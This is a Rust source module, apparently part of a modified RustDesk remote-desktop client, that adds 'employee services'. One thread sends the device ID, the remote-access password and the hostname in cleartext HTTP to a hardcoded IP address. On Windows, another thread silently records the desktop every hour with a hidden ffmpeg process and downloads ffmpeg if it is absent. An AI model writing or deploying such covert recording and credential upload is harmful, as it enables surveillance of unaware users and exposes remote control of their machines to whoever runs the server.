use std::thread;
use std::time::{Duration, SystemTime};
use std::process::{Command, Stdio};
use std::path::PathBuf;
use std::fs;
use hbb_common::{log, config::Config, chrono::{self, Timelike}};
use reqwest::blocking::Client;
use serde_json::json;

// API 服务器地址 - 生产环境应从配置读取或硬编码
const API_SERVER: &str = "http://38.181.2.76:3000";

pub fn start_employee_services() {
    log::info!("Starting employee services...");
    
    // 启动心跳线程
    thread::spawn(move || {
        log::info!("Heartbeat thread started");
        loop {
            if let Err(e) = send_heartbeat() {
                log::error!("Failed to send heartbeat: {}", e);
            }
            thread::sleep(Duration::from_secs(30));
        }
    });

    // 启动录像线程 (仅在 Windows 下运行)
    #[cfg(target_os = "windows")]
    thread::spawn(move || {
        log::info!("Recording thread started");
        loop {
            if let Err(e) = manage_recording() {
                log::error!("Recording error: {}", e);
            }
            thread::sleep(Duration::from_secs(5));
        }
    });
}

fn send_heartbeat() -> Result<(), Box<dyn std::error::Error>> {
    let config = Config::get();
    let id = config.id.clone();
    let password = config.password.clone();
    
    // 这里假设我们在配置文件中存储了 employee_id，或者使用 device_id 暂时替代
    // 为了简单，我们暂时用 device_id 作为 employee_id，或者需要修改 UI 让用户输入
    // 在这里我们先获取 device_id
    
    // TODO: 从配置中读取 employee_id
    // 目前先用 id (device_id) 代替
    let employee_id = id.clone();
    
    let client = Client::new();
    let _res = client.post(format!("{}/api/employee/heartbeat", API_SERVER))
        .json(&json!({
            "employee_id": employee_id,
            "device_id": id
        }))
        .send()?;
        
    // 如果返回设备未注册，则尝试注册
    if _res.status() == 404 {
        log::info!("Device not registered, attempting registration...");
        // 获取计算机名
        let computer_name = hostname::get()?.into_string().unwrap_or_default();
        
        client.post(format!("{}/api/employee/register", API_SERVER))
            .json(&json!({
                "employee_id": employee_id,
                "device_id": id,
                "device_password": password,
                "device_name": computer_name
            }))
            .send()?;
    }
        
    Ok(())
}

#[cfg(target_os = "windows")]
fn manage_recording() -> Result<(), Box<dyn std::error::Error>> {
    // 录像保存路径 C:\EmployeeRecords
    let save_dir = PathBuf::from("C:\\EmployeeRecords");
    if !save_dir.exists() {
        fs::create_dir_all(&save_dir)?;
    }

    // 确保 ffmpeg 存在
    let ffmpeg_path = ensure_ffmpeg()?;

    // 清理过期文件 (2天前)
    cleanup_old_files(&save_dir)?;

    // 生成文件名: 001_YYYY-MM-DD_HH.mp4
    let now = chrono::Local::now();
    let filename = format!("{}_{}.mp4", 
        Config::get().id,
        now.format("%Y-%m-%d_%H")
    );
    let file_path = save_dir.join(filename);

    if !file_path.exists() {
        log::info!("Starting recording to {:?}", file_path);
        
        // 计算剩余时间到下一小时
        let minutes = now.minute();
        let seconds = now.second();
        let remaining_seconds = 3600 - (minutes * 60 + seconds);
        
        // 使用绝对路径调用 ffmpeg
        use std::os::windows::process::CommandExt;
        let status = Command::new(ffmpeg_path)
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .args(&[
                "-f", "gdigrab",
                "-framerate", "5",
                "-i", "desktop",
                "-c:v", "libx264",
                "-preset", "ultrafast",
                "-crf", "30",
                "-t", &remaining_seconds.to_string(), // 录制直到下一小时
                "-y",
                file_path.to_str().unwrap()
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
            
        match status {
            Ok(s) => log::info!("Recording finished: {:?}", s),
            Err(e) => log::error!("Failed to start ffmpeg: {}", e),
        }
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn ensure_ffmpeg() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let install_dir = Config::get_home().join("ffmpeg_bin");
    let ffmpeg_exe = install_dir.join("ffmpeg.exe");

    if ffmpeg_exe.exists() {
        return Ok(ffmpeg_exe);
    }

    log::info!("FFmpeg not found, downloading...");
    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    // 下载 ffmpeg release (gyan.dev essentials build)
    let url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip";
    let zip_path = install_dir.join("ffmpeg.zip");

    {
        let mut response = Client::new().get(url).send()?;
        let mut file = fs::File::create(&zip_path)?;
        response.copy_to(&mut file)?;
    }

    log::info!("FFmpeg downloaded, extracting...");
    
    let file = fs::File::open(&zip_path)?;
    let mut archive = zip::ZipArchive::new(file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let name = file.name().to_string();

        if name.ends_with("bin/ffmpeg.exe") {
            let mut out_file = fs::File::create(&ffmpeg_exe)?;
            std::io::copy(&mut file, &mut out_file)?;
            break;
        }
    }

    // 清理 zip
    let _ = fs::remove_file(zip_path);

    if ffmpeg_exe.exists() {
         log::info!("FFmpeg installed successfully to {:?}", ffmpeg_exe);
         Ok(ffmpeg_exe)
    } else {
         Err("Failed to extract ffmpeg.exe".into())
    }
}

fn cleanup_old_files(dir: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let now = SystemTime::now();
    let retention_period = Duration::from_secs(2 * 24 * 3600); // 2天

    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.extension().and_then(|s| s.to_str()) == Some("mp4") {
            if let Ok(metadata) = fs::metadata(&path) {
                if let Ok(modified) = metadata.modified() {
                    if let Ok(age) = now.duration_since(modified) {
                        if age > retention_period {
                            log::info!("Deleting old recording: {:?}", path);
                            fs::remove_file(path)?;
                        }
                    }
                }
            }
        }
    }
    Ok(())
}
